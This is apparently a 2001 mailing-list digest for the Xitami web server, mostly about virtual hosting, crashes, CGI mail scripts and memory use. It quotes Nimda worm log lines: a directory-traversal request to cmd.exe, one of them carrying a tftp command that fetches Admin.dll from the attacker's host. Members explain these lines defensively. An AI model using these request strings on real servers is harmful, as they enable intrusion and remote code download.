  Could someone who is successfully doing DNS virtual hosting please =
send me their xitami.cfg and their defaults.cfg files for reference.  As =
well, could you give me a snapshot of the directory structure of the =
Xitami root directory.  I think I recall how the directory structure is =
supposed to look when configured correctly.

  How are the virtual site directories set up.  Like example A or =
example B, I believe its supposed to look like Example A (which is =
completely logical because it stores all of the Virtual Sites pages, =
files, scripts under a single directory branch).  But when I use the =

Here is what works for me using 2.4d7 on W2K Pro (worked the same on NT
4.0 Server).  Our primary site is www.arbor-freight.com with a virtual
site of www.audctrl.com.

The default.cfg that I believe is automatically merged with the
xitami.cfg contains:

#*END

[Ftp]
    Email-check=1
    Root=t:\ftphome

[Security]
    Filename=defaults.aut

[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\arbor

[Virtual-hosts]
    www.audctrl.com=audctrl.cfg

Then there is an audctrl.cfg (as pointed to by the default.cfg)
containing:

#*END

[Accesslog]
    Filename=audctrl.log

[Ftp]
    Root=t:\ftphome

[Security]
    Admin=0
    Filename=audctrl.aut

[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\audctrl

Note in our case we use the same ftp and cgi-bin for both the primary
and virtual, but use separate webpage directories.

Hope this helps!

Subject: [Xitami] Regular crash
Message-ID: <20010921010442.C77@eyup.org>

I've found that Xitami crashes regularly when a particular user access it.

How do I find out what is wrong?

I'm running v2.4d6 on OS/2. I have a CORE file but have no idea how to 
glean anything from it.


Any advice would be welcomed.

I don't suspect any foul play BTW.


The last entry in the access.log is:-

213.1.146.169 - abaid [20/Sep/2001:20:33:57 +0001] "ftp://213.1.146.169/" 230 0 "-" ""

This is immediately followed by a core dump with Xitami aborting.

I assumed you used the wizard to add the VH.  When you created:

[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\audctrl

Did Xitami automatically create the images, private and xitami
subdirectories in the \webhome\audctrl directory?  And is it creating the
necessary files that go into the directories (such as those you would find
the /htdocs/xitami directory) I am trying to keep everything related to a VH
consolidated to a single directory that would like this:

\webserver\host-vh1
     \cgi-bin
     \htdocs
          \images
          \private
          \xitami
     \ftproot
         \guests
         \pub
         \upload

\webserver\host-vh2


     \cgi-bin
     \htdocs
          \images
          \private
          \xitami
     \ftproot
         \guests
         \pub
         \upload

Last question, do you have to create any kind of alias mapping (aside from
the host-vhx.cfg file) using the "Aliases" or "VHosts" sections.  I would
think you don't but then again I thought this process would be easier.

Probably, it is has been so long ago I don't remember, but my guess is that you
could do it with notepad and then stop and restart xitami.

There is 1 subdirectory under e:\webhome\audctrl and I created it manually.
Under e:\webhome\arbor there is a \images subdirectory but I think I created it
and the other subdirectories were definately my creations.  I know of nothing
being automatically create in e:\webhome\audctrl.

I'm deliberately using a common cgi, ftp, etc., but what you propose should
work, if you manually create the subdirectories and edit the virtualhost.cfg
file accordingly.  In my installation there are cgi-bin, doc, images, pcnadmin,
pcntest, session, and xitami subdirectories under e:\webhome that were created
by the xitami install.

FYI: t:\ftphome is on a physically separate machine.  The drive t: is a mapped
network share to another machine.  I do not run xitami as a service, thereby
allowing the connection to t: to occur before xitami is manually started (I
think this could be done automatically as a service, but starting xitami
manually is not a problem either and xitami doesn't get in the way if I doing
other maintenance on that box).

Only thing I know of is the contents of the 2 .cfg files.

Russel,

Go to
http://www.tzo.com/MainPageSupport/HowToPage/HowToXitamiServerMultiDomains.h
tml.  This is a tutorial with screenshots showing how to set up a virtual
domain with xitami.  TZO is a DNS provider that happens to provide some
xitami help for their users.  If this doesn't clear up the prob let me know
and I'll send you my config files, or I'll look at yours.  I'll also need a
few more details about what errors you are getting, etc.

  Subject: [Xitami] HELP - virtual DNS hosting



  Ok, I am caving in and need some help here folks.  This is driving me
nuts.  Two years ago, on a Win98 platform I was able to get virtual hosting
to work via DNS.  But now I am running a newer Xitami version on WinNT 4.0
and can't seem to get anything to work.

  I am testing this all locally on private LAN - then once the sites are
working properly will deploy the server to the internet with valid
addresses.  My local DNS server is set up correctly and all the PTR and A
records authenticating properly.

  Could someone who is successfully doing DNS virtual hosting please send me
their xitami.cfg and their defaults.cfg files for reference.  As well, could
you give me a snapshot of the directory structure of the Xitami root
directory.  I think I recall how the directory structure is supposed to look
when configured correctly.

  How are the virtual site directories set up.  Like example A or example B,
I believe its supposed to look like Example A (which is completely logical
because it stores all of the Virtual Sites pages, files, scripts under a
single directory branch).  But when I use the Virtual Host Wizard it is
creating the directories similar to Example B (which doesn't make sense
because its seperating the virtual sites files under multiple directory
branches).

  Example A:
  ===========
  /webserver
     - cgi-bin
     - htdocs
     - ftproot
     - carpe-dm
         -htdocs
         -cgi-bin
         -ftproot
     - kdralumni
         -htdocs
         -cgi-bin
         -ftproot

  Example B:
  =============
  /webserver
     - cgi-bin
         -carpe-dm
         -kdralumni
     - htdocs
         -carpe-dm
         -kdralumni
     - ftproot

  What the heck am I doing wrong???????????????????????????????

If you're running Xitami as a service, make sure it runs under an 
account that has access to write into the Xitami temporary 
directories.  To check whether it's a file permissions issue, try 
running the Xitami executable from a DOS window ('xiprosrv -d').  You 
can also try running the service under the Administrator user id 
(which should have access to all file systems).

Hi,

Has anybody gooten Xitami/Pro running on FreeBSD?
If so, what version and how did you get it (the source lib or a binary).

If the source kit was involved, how hard is it to build it on FreeBSD?

Thanks,

Hi all

I wonder if somebody would be kind enough to help me.

I have found and downloaded the MAILTO (v1.6) program from the Xitami
website and am having no small amount of trouble using it as a CGI app. I
have pasted the contents of the CFG file and the HTML FORM code that I am
utilising. I wonder if somebody could please tell me if there is anything
wrong in either. I have read and re-read the readme txt file but to no
avail. I fear I must be missing something. I have included more details
below:

When trying to run MAILTO as a CGI app and utilise it from within the FORM
action field on my HTML pages it simply displays its command line arguments
text output, within the HTML target frame. No mail gets sent. It seems it is
being successfully accessed as a CGI app but instead of sending mail it just
throws back the command line arguments instead.

The spec and environment:
Windows 9x/ME based (version shouldnt matter should it?)
ActiveState ActivePERL v5.6.1.269
Xitami Web Server v2.5b2

I can supply on an individual basis the a text file with the CGI environment
variables to anyone that can promise to help.

This is my last hope, I really need this to work. Thank you in advance for
you help. I have tried emailing the author but the email address distributed
with the zip file is no longer valid.

In addition, is there any way to get MAILTO to redirect the browser to a
specific web page/URL after successful form submission (rather than have the
entire page code included in the CFG file)?

In case anybody is wondering I cant use FormMail as it requires a SENDMAIL
program which isnt present on my OS (I only seem able to find it on NT/2000
or UNIX).

Failing the above is there any free, publicly available formmail / mailto
program out there on the web that anyone knows about? I cannot use the ones
provided by my ISP as they will not alter the referrers section of their
formmail script to include me.

I wrote the group 3 days ago about this but no response.  When I plug 
in the complete url you provide I can view the source of your root htm 
file, same thing as going to just your ip.   

I'd experiment with this but my provider is pulling the plug today on 
anyone infected.  Not sure if they are smart enough to realize I'm testing.

The same URL with my (Xitami) server in place of your IP number gives my

Weird. Did you just click on the link, or did you cut & paste it?  Some browsers (like OE) will change the url of that link to
something slightly different, which will give a 404.

Subject: [Xitami] Virtual Host Problem
Message-ID: <200109212248.AAA24063@sxpublic.nxrda.imatix.net>

Hello..

I'm having a problem getting virtual hosts to work. I have managed to 
get it working, but I'm wondering if its the correct way to do it.

I've been through the VHost Wizard to setup a new virtual host for 
www.benryder.co.uk - that works fine, and points to the correct 
directory, yet benryder.co.uk (minus www) shows the default Xitami page. 
If I choose the Vhost Submenu within benryder.cfg (saved config for 
www.benryder.co.uk) and add benryder.co.uk --> benryder.cfg , and 
restart the server it still shows benryder.co.uk with the default Xitami 
page.

However if I click on the defaults button with Virtual Hosts, then on 
the VHost Submenu and add benryder.co.uk to the list, it works ??

It may be that I'm doing this the right way, but it may not be? If 
someone could fill me in I would be very grateful !

Also, as I have to put double in the Defaults VHost Submenu (eg. one for 
benryder.co.uk and one for www.benryder.co.uk, will I eventually run out 
of options for other domains I may want to add ??).

Thanks in advance !

Ben.

Ben, 

In your defaults.cfg:

[Virtual-hosts]
    * = "basehost.cfg"
    www.benryder.co.uk = "foo.cfg"
    benryder.co.uk = "foo.cfg"

Where foo.cfg = your configuration file for www.benryder.co.uk

And no, you won't run out of lines to add virtual hosts in the .cfg file.

WAIT -- I just noted that the window header says "Cisco CE Error".
Unless you call yourself Cisco, I bet a router is blocking the request. 

And "DUH!"-- my school IS filtering Nimba packets ("malformed requests")
at the border. And we use a lot of Cisco. 

So nevermind. What I'm seeing is a mile up the road from me, not your
server.

If you've got a repeatable bug (and it sounds like you do), then the
main thing to do is to try to gather as much information about the
circumstances it occurs in as possible.  In particular turning on the
Xitami server debugging support ([Server] debug=1) and trying again
should give you more detail on the command(s) the user's FTP program is
sending at the time that Xitami crashes.  It certainly sounds like it's
choking on one of the commands being sent for some reason.

The next thing I'd usually try is network traffic snooping, which is
easy under Linux/Unix (tcpdump, ethereal, snoop, etc), but off hand I
can't think go a way to do it under OS/2.  This gives you a
packet-by-packet view of the data that Xitami is sending and receiving,
which can help narrow down the troublesome cause further.

If you have the EMX development tools installed, you can try:

gdb xitami.exe core

And then "bt" (back trace) to try to find out which routine Xitami was
running when it crashed.  This may or may not be as useful as the
information from the debug log, depending on what type of bug it is (eg,
some bugs corrupt things which only cause crashes later on, so what you
want to know is where it was corrupted not where it finally crashed
because of the corruption).

AFAIK there has never been an Xitami/Pro for FreeBSD.  Other than
figuring out how to distribute it, there's no real reason there couldn't
be one, but I don't think anyone has asked before.  (Xitami/Pro for
Windows and OS/2 has always been distributed as a binary; at one point I
think there was one build of Xitami/Pro for Linux done and distributed
as a binary -- but this was several years ago and probably wouldn't run
well on modern Linux systems.)

And what about the source kit? I may want Pro but it will have to run on
FreeBSD or Linux.
Is the source kit known to compile on FreeBSD?

Which is to be expected, you probably don't have a scripts directory,
and even if you do, it's unlikely to have a winnt/system32/cmd.exe file!

>This gives a 200!?:
>http://24.12.24.86/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir
>
>Do you know what this means?

The 200 is because Xitami finds a page to return.  Your home page.  This
happens under Windows, Linux, etc, although the reason that it happens is
a little bit involved.

The major difference between the two URLs is that the second one has an
illegal %-escape in the URL (the "%%" is illegal; it should be "%nn"
where the "nn" is two hex digits, and "%25" to put a real "%" in).
When Xitami encounters this illegal "%%" it thinks that must be the end
of the "real" URL, because it's found a bit that doesn't make sense.
(To be precise, as a result of the way the routine that decodes the hex
digits is coded, it stores a NUL into the string at that point.)

This gives a URL of: 

http://24.12.24.86/scripts/..

Next Xitami's path resolution code kicks in, which resolves ".." by
eliminating the previous path bit (down to leaving nothing in the URL),
which gives:

http://24.12.24.86/

Hence a 200, serving the default index page.

So, nothing really bad is happening (although it does mean that you'll
send the worm a copy of your index page for each request like that it
sends, which may be a bit more traffic than a 404).

I'll add it to our bug list.  When Xitami finds an illegal escape like
that it should reject it explicitly (with a 404 automatically, or some
sort of malformed request message).

It looks like you've got a typo there, the middle two numbers are
separated by a comma (,), rather than a full stop (.).  Otherwise you're
on the right track.

Maybe it send the mail to the html output file instead.

In addition, is there any way to get MAILTO to redirect the browser to a 
specific web page/URL after successful form submission (rather than have 
the entire page code included in the CFG file)?

There a at least two possibilities:
    - with javascript you can use a onSubmit="window.location.href=..."
    - instead of generating a html page, you can send a Location: 
http://www.hdhdshsdhds-statement with two CRLF's
      and your client's browser will load that page.

A sendmail is a rather simple program, it only has to talk to a smtp server...

Xitami doesn't (currently) include support to do this automatically (ie,
it has nothing like mod-redirect in Apache).  You can probably do
something similar with a filter (eg, PHP), or client-side Javascript
though.

Easy under OS/2 also (but can only capture own machine traffic, so not
general network snooping).  The original enquirer should look at the help
seen on typing:
    tcphelp iptrace

The Xitami source kit has been compiled on FreeBSD (IIRC there's even a
FreeBSD port for it), but I'm not aware of anyone who has compiled the
Xitami/Pro source on FreeBSD.  In theory it shouldn't be too tricky,
a Xitami/Pro is basically the Xitami source, plus some code to interface
to SSLeay/OpenSSL which should be very portable.  The Xitami source is
freely available, but the Xitami/Pro extensions have traditionally been
a commercial product, hence fewer people have compiled Xitami/Pro.

If you're still keen mail me off the list (ie, directly to
ewen@imatix.com) and I'll bring the issue up with someone at iMatix HQ.

Xitami for Windows
This list describes how to set up the PHP CGI binary to work with Xitami on
Windows.

Make sure the webserver is running, and point your browser to xitamis admin
console (usually http://127.0.0.1/admin), and click on Configuration.

Navigate to the Filters, and put the extension which php should parse (i.e.
php) into the field File extensions (.xxx).

In Filter command or script put the path and name of your php executable
i.e. c:\php\php.exe.

Press the 'Save' icon.

Whilst it is repeatable, it isn't something I can reproduce myself because 
I don't know exactly what software is being used although I think it is 
being run under Win98 and this user only connects every one or two weeks.

Tcpdump is available for OS/2 but I've never managed to get it working,
however I don't think packet snooping is a realistic option unless I can 
set up a controlled test.

I'm not familiar with GDB, but here's the output I get following your

I'd be interested in which tools you use for building Xitami on OS/2 as
I'm hoping to put together an updated set as part of the UnixOS/2 project.

IPTRACE is OK in a controlled environment, but it's not something you can 
leave run for weeks at a time (unless you a huge ammounts of free disk 
space :-) ).

One thing I have been hoping to find for several years is a *usable* 
program for looking through a trace. IPFORMAT must be one of the crudest 
programs around. Apparently it can be used to convert a trace to "Sniffer" 
format so that it could be used with other tools, but the '-x' flag which 
is supposed to do this doesn't work for me.

Paul yes you can do that. They can even have their own domain name, all of
them pointing at your IP. In Xitami, you then set up virtual hosts that
will redirect all requests for 'www.website1.com' to /websites/website1
and so forth. However, what sort of connection do you have? T1? T3?
Speed is key.

I suggest: Get a host name at www.active-domain.com for $9.95/yr and
use their controls to have the host name point to your IP. Use Xitami
Virtual Hosts to set up the web page directory. Easy as pie.

What version of OS/2 Xitami are you using?  I also had crashes about every 2 days (give or take).  I found 
the following 2 items:

1) There is a patched version of Xitami on Hobbes (http://hobbes.nmsu.edu) bos225b4p2.zip which fixes 
some problems in (what is now) the current OS/2 Xitami release.

2) Setting the EMX env var in config.sys to:   SET EMXOPT=-c -h256 -!0x800
(This fixes some file handle issues in the OS2 EMX runtime)

With both these in place I've been up and running for 4 days now with no abends in Xitami (A minor record 
for me )

I don't understand the need for a patched version. The OS/2 version seems 
well supported. If you run a patched version the the developers of the 
original won't have a clue what someone else may have done to it.   
 
I have EMXOPT set to -h1024. What are the other two parameters for?

The -!0x800 was found at the Apache site (http://www.apache.org/~bjh/apache2/) as required for the EMX 
runtime. This is an apparent internal EMX work-around for file handle leaks in the lib. The  -c stops core 
dumps (my choice, can't read them anyways)

When using the variable PHP_SELF  with xitami , the directory path is

I obtain something like

    Ok, I am caving in and need some help here folks.  This is driving =
me nuts.  Two years ago, on a Win98 platform I was able to get virtual =
hosting to work via DNS.  But now I am running a newer Xitami version on =
WinNT 4.0 and can't seem to get anything to work.

    I am testing this all locally on private LAN - then once the sites =
are working properly will deploy the server to the internet with valid =
addresses.  My local DNS server is set up correctly and all the PTR and =
A records authenticating properly.

    Could someone who is successfully doing DNS virtual hosting please =
send me their xitami.cfg and their defaults.cfg files for reference.  As =
well, could you give me a snapshot of the directory structure of the =
Xitami root directory.  I think I recall how the directory structure is =
supposed to look when configured correctly.

    How are the virtual site directories set up.  Like example A or =
example B, I believe its supposed to look like Example A (which is =
completely logical because it stores all of the Virtual Sites pages, =
files, scripts under a single directory branch).  But when I use the =
Virtual Host Wizard it is creating the directories similar to Example B =
(which doesn't make sense because its seperating the virtual sites files =
under multiple directory branches). =20

The vhost scheme in Xitami is lightweight; very little load on the CPU. 

As I understand it: Somewhere above "many thousand", there will be a
-slight- delay on each hit. Unless you have a VERY fast connection, this
will be lost in network delays. 

At "thousands", any multi-host server becomes hard to manage anyway-- I
think you will lose your mind or at least lose track of who owns what
vhost long before Xitami gets confused. 

On Windows, on P-166 machines, folders with thousands of subfolders can
be slow to open. That's quite outside Xitami's control. A faster Windows
box or unix with big RAM may manage thousands of folders better. 

I certainly see no lag on a machine with a dozen vhosts. I think someone
here runs hundreds with no problem.

I am trying to set up multiple VHosts using Xitami under Win2K-Pro, using
SimpleDNS Plus for DNS.

DNS works since my domain pings and replies fine.  Also, the domain does
resolve to the default Xitami screen.  Also, my static IP works fine and
resolves to the default Xitami page.  If I type in my domain, it resolves to
the default Xitami page also.

However, I have set up a VHost and I am not getting the "index.htm" page I
set up as the root as a resolve of the domain request in another machine's
browser!!!

I ALREADY CHECKED THE FAQS:
1.) "hosts" file does not have the ".sam" ending
2.) when I test the VHost by typing in "www.mayanarch.com" I get the
following result= C:/Xitami/wwww.mayanarch.com
3.) Document root is set up as C:\Xitami\webpages\MayanArch\index.htm

What could be going wrong???  Can someone test this from outside??

I have noticed that Xitami can serve a page for a directory that is NOT
shared under Windows.

The default Xitami pages come up despite the fact that the Xitami
directories are "not shared" under Win2k.

How can it do this???

Is this a security breach that needs to be addressed in some way?

If I create new directories for VHosts under the C:\Xitami\webpages\
directory, do I need to share them out under Win2K???

Alvaro:  This is not really a security breach.  Think of Xitami as your email program; when you send someone an attachment, does the
folder your send the file from need to be shared for the email program to send out?  No, it does not, because YOU have permission to
access that folder.  Install Microsoft's IIS, and see what it does...same thing as Xitami....no shared web folder.

If you are really paranoid about it, you should run Xitami as a NT service, and create a user/group just for that service, which has
access only to the files needed.  I suppose you really should do this anyway, as there is no such thing as too much precaution.

Xitami does not use Windows' concept of sharing.

Basically: Windows, being DOS with a pretty face, has weak
permissions. Unless you go to some trouble, any program on the
machine can access any file on the machine. 

Most Webservers, including Xitami, follow the rule of only
serving files in or below a specific directory. On my school's
unix box, the directory must be named "public_html", which gives
users a little warning that anything in there is "public", unlike
the rest of their directories which they may set "private".
Xitami lets you set the one specific directory that will be
served; typically c:/Xitami/webpages. It _IS_ up to you to be
sure that directory only has files you want "everybody" to see.

One exception: in addition to ./webpages, Xitami will serve files
in ./cgi-bin. By default it will only serve them by executing
them (better know what is in there!); but it can also serve
non-executable files (GIF images to support CGI apps, for
instance). 

In WinNT, with its OS/2 core, you actually have strong
permissions. You can create a "user" that has highly limited
access to files, and launch Xitami as that user. If you let other
people put CGI scripts on your server, you maybe should run
Xitami from a limited-access account. 

I "trust" Xitami to serve ONLY from the directories I told it to
serve from. Note that some other webservers (spelled "MS") have
been fooled by URLs with excess dots (implying parent directories
above where the web root should be). Also until recently Xitami
under DOS could be confused by "files" that were really devices
(even DOS sometimes can't tell the difference). That was unlikely
to spill secrets, but could lock-up the server as it waited
(forever) for data to come out of the printer (that is fixed).

With four "w"s? Anyway, that URI box isn't for testing vhosts. 

> Document root is set up as C:\Xitami\webpages\MayanArch\index.htm

That should probably point to a Folder, not a File. Remember, the
vHost will have many files. Point the vHost to a folder. There is
a different place to tell Xitami what file to look for if no
specific file is requested. 

> Can someone test this from outside??

http://www.mayanarch.com/ = Xitami default

http://www.mayanarch.com/mayanarch/ = "MayanArch WELCOME"

The files are there. But your vhost is not pointing to the right
directory. "./mayanarch" is where it should point to.

Hi Alvaro

first you have one too many w's in www there and while i dont know your dns
setup you either need dynamic dns for the main domain or you need a record
for each sub ...www.yourdomain.com is a sub of yourdomain.com

There sure is. Still 2.4d7 though, I didn't see a reason to upgrade,
because that was mostly because of the reserved names in Win9x if I
remember correctly.

May I take the opportunity to praise Xitami; it's really funny to
see how code red tries to infect it. The log files *do* become a
little longish, though. Also the traffic has increased quite
noticeably because of the infection attempts, which will show on the
next month's ISP bill. (Apparently you don't need to be actually
vulnerable these days to be victimized, it's sufficient if enough
other web servers are.)

I doubt Xitami/Pro will be any problem at all to compile, unless
e.g. there are 3rd party libraries used that don't exist on FreeBSD.
OpenSSL does exist on FreeBSD; SSLeay I don't know about, but I
assume it's there too, or at least a good imitation thereof.

Me being the FreeBSD port maintainer of Xitami, please feel free to
contact me if you think I might be of any assistance.
You might also consider to ask on the FreeBSD mailing lists; for
general questions try questions@freebsd.org, and for port-specific
stuff ports@freebsd.org.

Subject: [Xitami] Xitami/Pro webmask issues
Message-ID: <4eebb54ee8e0.4ee8e04eebb5@orange.net>

Hi there,

I'm using Xitami/Pro - downloaded afresh last month and am having 
problems with the webmask facilities.

I'm putting the definitions in the default.aut file.

Note: This also contains the userid/password details, and all these are 
working exactly as I would expect.

However the webmask seems to be irratic to say the least:

* When used with external files (via the @ symbol) it seems to be 
completely ignored.
* Using the negative mask using the "!" symbol doesn't seem to work at 
all either
* Using a positive mask (just specifiying ip numbers with or without 
wildcards) mostly seems to work, but I still get some IP numbers - that 
clearly aren't in the list - being let through, whilst others are not.

Are there any "gotchas" I'm missing here?  Clearly something is 
seriously wrong at the moment! Any advice would be appreciated!

Cheers - Steve

I haven't tried it.  I only started using webmasks after NIMDA started 
bombarding my server with intrusion attempts.

Would you recommend I try the public release with the same setup?

If so, should I run the public executable from the same directory (with 
the same setup) or would you recommend I put in an entire fresh install?

Hello all,

I have Xitami running on a P233 with 28MB Ram and Win98se and have
already put the windows-swap file on a fixed size (although windows
warns me I shouldn't mess with it) but the harddisk keeeeps running
even if xitami "is not doing anything".

Xitami is now simply running using the tray-icon but the way the harddisk
keeps rattling makes me nervous. When I shut down xitami, the harddisk
stops making noise....

How should I change Xitami's setup so that it is not that harddisk
intensive anymore?

I just went through this and finally got mine to work..  Here is what I did
and think might work for you.

When using the VHost wizard you need to define the following fields as such:

Create virtual host profile:      hostx.cfg (.cfg is assumed)
Select IP address:                  All Addresses (recommended)
Or, enter DNS host name:    www.yourdomain.com
Web Page Root Directory:    /Xitami/hostx/webpages
CGI-bin directory:                /Ximati/hostx/cgi-bin
FTP root directory:              /Ximati/hostx/ftproot
Create directories if necessary?  Checked

Whats important in the above example is that you make soft references to the
directory path using forward "/" slashes.  I tried using windows default
back "\" slashes and had problems.  I also made a hard reference using
"c:\PATH" and had problems too.  It seems Xitami even treats its configs and
Path references like URLs using the forward "/" slash.  I choose to do the
above configs because that allowed me to contain all files and
sub-directories within a single root directory.  Others have choosen to
create the /Xitami/hostx/webpages for their html docs but then did
/Xitami/cgi-bin to contain ALL CGI files for all domains in a single
directory.  For myself I like a little bit more organization.  However, some
of my domains do share the same CGI files (most of my databasing needs all
rely on the same database utilizing seperate tables from the same DB, the
reason I did this is because I designed a Perl DB that allows me to create
tables, queries, entry forms, etc on the fly)  In order to share the same DB
across multiple domains (but make it look like each domain has a separate
DB) I created a VHost domain simply to host the DB and nothing else.  Then
when DomainX needs certain DB functions I will pass URL (most likely from a
FRAME subset) from DomainX to DomainDB.  This process can be repeated across
multiple domains allowing me to manage only one DB.  Security is not the
greatest but is managed through a series of checks and balances using Cookie
s.

Anyway, I got off on a tanget.  Xitami only creates the directories.  It
doesn't place any "index.htm" or "default.htm" files in the directories just
created for "hostx".  You shouldn't have to make any references any where
else, as long as your FORWARD (A records) DNS is working correctly for that
VHost then all should work OK.  The only PTR DNS (reverse) record for the
Xitami server should be for the main domain on that server.  In my case, if
someone accesses my server via the IP address then a default page (managed
by the cgi files of DomainDB) is displayed simply showing links to all the
domains hosted on that server.

I intend on using my server as a training device, once I get everything
completed people will be able to access my site and look at config files,
domain references and mainly the DB I created.

Hope some of this helps.

Brilliant!  Now the list is permitting through Base64 encoded HTML
containing a malicious VBScript.  (Doesn't affect me, since I'm running
OS/2, and read my mail in a simple DOS mail reader; however, it might
well cause problems to the OS-challenged.)

I've suggested before that the list ought automatically to drop posts
which are multipart/alternative.  Could I now extend that to ban ANYTHING
that isn't just PLAIN ASCII text.

It's easy enough to write a filter that preprocesses traffic before the
exploder stage, reads the (MIME) headers, and bounces unwelcome traffic
back to sender.

Look out for more of these, as folks running Windoze get infected with
Nimda and other similar viruses, and happen to have the name of the
mailing list in their address books.

Distantly. 

IBM and MS worked together on a clean (not DOS) operating system. Later
they had a falling-out. IBM released OS/2, and soon after MS released
NT. They have quite different user interfaces, but much in common
underneath. And NT has or had some support for OS/2 programs with a
limited subset of Presentation Manager functions. 

As for security and multitasking: if CPM/DOS are at one end, with Win9x
just above, and a good unix is at the other end: both OS/2 and NT
cluster far above DOS/Win9x but below unix in both potential security
and in simplicity. They may not be twins under the skin, and sure are
not kissing cousins, but are somehow closely related.

28 megs is really very-very tight. I lived for years with 32 megs, even
with NT, but the machine was very bare compared to a typical Win98
installation. 

More RAM may stop thrashing. 

You may just be getting hit by a lot of Nimba requests. Xitami has to
look for the bogus file and also log the request and error to files.
Again, more RAM may help by allowing Windows to use some RAM to cache
the hard drive. 

BTW: thrashing the drive probably won't hurt it. I know an ex hard drive
designer and he tells tales of the "torture rack" they used to test new
designs. The worst Windows thrashing is nothing like a worst-cast
thrash-test.

Well yes, I know it is tight. But I chose xitami because I thought it
had a pretty low memory-footprint(?).

Current situation:
With "system monitor" w98 reports about 84Megs allocated, but this is
constantly changing/swapping to 87Mmegs and back to 83Megs.

Why on earth would xitami (the only programming 'running') be
allocating memory and freeing memory so often?
Like, what's the xitami footprint on the memory?

I have disabled the debug-, log-, server-, error-reporting to see if
it matters, but that's hardly the case.
And I can't imagine that looking for a file makes a system running the
harddisk this often :-]

Ok that's probably it.. I have thought about changing to Linux as

Not really sure what your problem is, but I ran Xitami web & FTP server for quite a while a a 466/66DX with 16MB of RAM running
Win98SE (I slimmed it down), also running SyGate NAT & windows filesharing via IPX.  I never had any trouble with it, and it was
pretty fast.

I'm sorry if this isn't how this list works. Do I just ask away? Here goes...

I was wondering if anyone can help me figure out some odd things I've seen 
in my logs after the nimda worm hit the scene.

I'm troubled by lines like this:

66.27.221.19 - - [25/Sep/2001:15:01:59 -0500] "GET 
/scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2066.27.221.19%20GET%20Admin.dll%20e:\Admin.dll 
HTTP/1.0" 200 2006 "" ""

Although I more or less understand stand what's happening I have a few 
questions. Like about the fact that I don't have a "/scripts/" directory 
and still I got a 200 response. (a few months ago I watched code red return 
404 over and over and over again) I can't even find a directory on the 
entire local disk where I keep Xitami named "scripts"  Anyway I've turned 
off my sever for now. I'm running Win2000pro. I have never installed IIS or 
FrontPage, but I use IE 5.

Take care,

Eric

WHAT ???

To some degree, that's bogus. Win9x will "allocate" all the RAM and swap
it can find, even if it does not have anything useful to put in that
space. 

But I've seen win95 run fairly quietly in 16Megs, and not gasp too loud
in 8Megs. I know Win98se is bigger, and 28M is way below what most
people like, but 84 megs? And less thrashing if Xitami is stopped? 

>  what's the xitami footprint on the memory?

500 Kb to 4 Megs, more or less, depending. I have run Xitami on a _4_Meg
machine without crowding (but that was Windows 3!). 

BUT note that the "Graphical Interface" version of Win32 Xitami has a
known memory leak or something. I've only used the Command Line or
Service versions so I don't know the details. 

WinNT has a better Monitor than Win9x. It shows, on my main machine, up
for 8 days and fairly busy:

Mem usage - 3,345 K (varies a little)
VM size - 1,812 K

The machine has 128 Megs RAM (RAM was cheap that day) but NT only shows
35 Megs in use now, 36 Megs peak commit charge. 8 Megs goes to RealAudio
server; about 4 megs to my remote control app. When I ran in 32 megs
without those two apps, it often sat at 24 to 28 megs in use.

Total memory shows as "351M" which suggests I have Swap set to 220 Megs.
(Frankly, if this machine EVER swaps it probably means something has
gone very wrong... but when cleaning out cluttered log folders sometimes
the filesystem needs a lot of workspace.)

Ewen explained that that URL is illegal; designed to trick IIS. You are
not supposed to have two percent-signs in a row. Whatever it does to IIS
does not happen to Xitami.

But it returns "200 OK" because Xitami "knows" the URL is illegal, and
trims-off the "bad part". Somehow it ends up thinking they want "/", and
it sends your home page.

Nobody here has reported ANY Nimda trouble on Xitami, except the large
log files.

Yup, that's how it works.  Although it's often worth reading a bit to
see the sorts of questions being asked, and perhaps checking the mailing
list archives before asking.

You probably want to read:

http://lists.xitami.org./pipermail/xitami/2001-September/000967.html

In short: due to the way that Xitami is resolving the URL with the
illegal '%' encoding, it manages to think it should serve up the home
page for the site, so it sends that as a 200 response.  Other than a
little extra traffic, nothing bad happens.

The reason Xitami servers are not being infected is that Xitami does not have the "/scripts/" and other
items that Nimda is trying to exploit.  It is looking to use items made available by IIS and Xitami just
doesn't have them (thank God).  Error messages will automatically be generated for these requests and
recorded in the errors.log file, but other than log file size and slightly redeuced bandwidth (incoming
requests and outgoing error messages) nothing real serious is happening to Xitami sites.

No one has reported here a reason to turn off an Xitami server because of this worm.

THANKS TO EVERYONE THAT HAS RESPONDED.  I FINALLY DID GET IT TO WORK.  THE
BELLOW INFO IS HELPFULL, SINCE IT ACTUALLY TELLS YOU WHAT NEEDS TO BE
WRITTEN IN ALL THE REQUIRED FIELDS.

WHAT HAD ME IS THAT I AM NOT USED TO PUTTING THE "WWW." IN FRONT OF A DOMAIN
WHENEVER AN APPLICATION HAS A FIELD FOR YOU TO ENTER A DOMAIN.  I HAVE
ALWAYS ENTERED THEM AS "YOURDOMAIN.COM" WITHOUT THE "WWW."


Create virtual host profile:      hostx.cfg (.cfg is assumed)
Select IP address:                  All Addresses (recommended)
Or, enter DNS host name:    www.yourdomain.com
Web Page Root Directory:    /Xitami/hostx/webpages
CGI-bin directory:                /Ximati/hostx/cgi-bin
FTP root directory:              /Ximati/hostx/ftproot
Create directories if necessary?  Checked

Whats important in the above example is that you make soft references to the
directory path using forward "/" slashes.  I tried using windows default
back "\" slashes and had problems.  I also made a hard reference using
"c:\PATH" and had problems too.  It seems Xitami even treats its configs and
Path references like URLs using the forward "/" slash.

I HAVE GOTTEN XITAMI TO WORK WITH THE "\" DIRECTORY.  MY DIRECTORY LOOKS AS
FOLLOWS AND SEEMS TO BE WORKING FINE:

C:\XITAMI\WEBPAGES\MYVHOST\

SO FAR, SO GOOD.

GO LOOK:
www.mayanarch.com
www.thinkincircles.com
www.simangroup.com

Hi,

Now that I have my VHosts set up, I would like to work on them with a
graphics computer, and not on the server.

I would like to be able to do this remotly.

How can I get either FPage or Dreamweaver to gain access into my VHosts to
edit/post HTML files????

The default setup is not allowing FPage in, and I dont understand why.  I
know I wont be able to use the "themes" or "extensions".  However, I just
need the editor to post.

Dreamweaver works with FTP.  How can I get FTP access to my VHost's webpage
directory??  Do I make the FTP directory point to the Root directory of the
webpages??
